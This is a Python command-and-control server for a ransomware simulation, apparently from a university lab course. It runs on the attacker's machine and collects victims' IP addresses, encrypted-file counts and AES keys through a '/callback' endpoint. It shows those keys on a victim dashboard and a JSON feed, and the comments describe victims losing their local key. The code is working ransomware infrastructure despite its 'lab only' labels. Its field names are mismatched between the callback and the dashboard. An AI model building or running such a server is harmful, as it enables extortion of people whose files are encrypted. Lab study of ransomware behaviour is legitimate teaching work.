#!/usr/bin/env python3
import json
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

import config

# ============================================================
# c2_server.py — Run this on KALI LINUX (Attacker)
# IE207 - UIT - LAB ENVIRONMENT ONLY
#
# Simulates attacker C2 (Command & Control) server.
# Receives encryption key callbacks from Windows 11 victim.
#
# Key finding from experiments:
#   After victim encrypts 99 files:
#     - Sends key to this server (POST /callback)
#     - Deletes local key
#     - Victim CANNOT self-decrypt
#     - Attacker has the key (simulating ransom payment required)
# ============================================================

victims = []  # List of victim callbacks received


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        """Suppress default HTTP access logs."""
        pass

    def do_GET(self):
        if self.path == "/":
            self._serve_dashboard()
        elif self.path == "/victims":
            self._serve_json(victims)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/callback":
            self._handle_callback()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_callback(self):
        """
        Receive encryption key from victim (Windows 11).
        This simulates ransomware reporting to attacker:
            - Victim IP
            - Number of files encrypted
            - AES encryption key (victim needs this to decrypt)
            - Duration of encryption
        """
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)

        try:
            data = json.loads(body)
            data["received_at"] = datetime.now().isoformat()
            victims.append(data)

            # Print to terminal (attacker sees this)
            print("\n" + "=" * 55)
            print("[!] NEW VICTIM CALLBACK RECEIVED")
            print("=" * 55)
            print(f"  Victim IP    : {data.get('ip', 'unknown')}")
            print(f"  Files        : {data.get('file_encrypted', 0)} encrypted")
            print(f"  Duration     : {data.get('duration', 0):.2f}s")
            print(f"  Key          : {str(data.get('key', ''))[:30]}...")
            print(f"  Timestamp    : {data.get('timestamp', '')[:19]}")
            print(f"  Total victims: {len(victims)}")
            print("=" * 55)
            print(f"[INFO] Dashboard: http://localhost:{config.CALLBACK_SERVER_PORT}/")

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "received"}).encode())

        except Exception as e:
            print(f"[ERROR] Callback parse error: {e}")
            self.send_response(400)
            self.end_headers()

    def _serve_dashboard(self):
        """Serve simple text dashboard."""
        lines = [
            "=" * 55,
            "  C2 DASHBOARD - LAB ENVIRONMENT ONLY",
            f"  IE207 - UIT | Victims: {len(victims)}",
            "=" * 55,
        ]

        if not victims:
            lines.append("  No victims yet. Waiting for callbacks...")
        else:
            for i, v in enumerate(victims, 1):
                lines.append(f"\n  [VICTIM {i}]")
                lines.append(f"    IP        : {v.get('victim_ip', 'unknown')}")
                lines.append(f"    Files     : {v.get('files_encrypted', 0)} encrypted")
                lines.append(f"    Duration  : {v.get('duration', 0):.2f}s")
                lines.append(f"    Key       : {str(v.get('key', ''))[:40]}...")
                lines.append(f"    Received  : {v.get('received_at', '')[:19]}")

        lines.append("\n" + "=" * 55)
        body = "\n".join(lines).encode()

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_json(self, data):
        """Serve JSON response."""
        body = json.dumps(data, indent=2).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def run():
    server = HTTPServer(
        (
            config.CALLBACK_SERVER_HOST,
            config.CALLBACK_SERVER_PORT,
        ),
        C2Handler,
    )
    print("=" * 55)
    print("  C2 SERVER - IE207 - LAB ENVIRONMENT ONLY")
    print(f"  Listening  : :{config.CALLBACK_SERVER_PORT}")
    print(
        f"  Dashboard  : http://{config.CALLBACK_SERVER_HOST}:{config.CALLBACK_SERVER_PORT}/"
    )

    print(
        f"  Victims    : http://{config.CALLBACK_SERVER_HOST}:{config.CALLBACK_SERVER_PORT}/victims"
    )
    print("=" * 55)
    print("  Waiting for victim callbacks...")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[INFO] C2 Server stopped.")
        server.server_close()


if __name__ == "__main__":
    run()
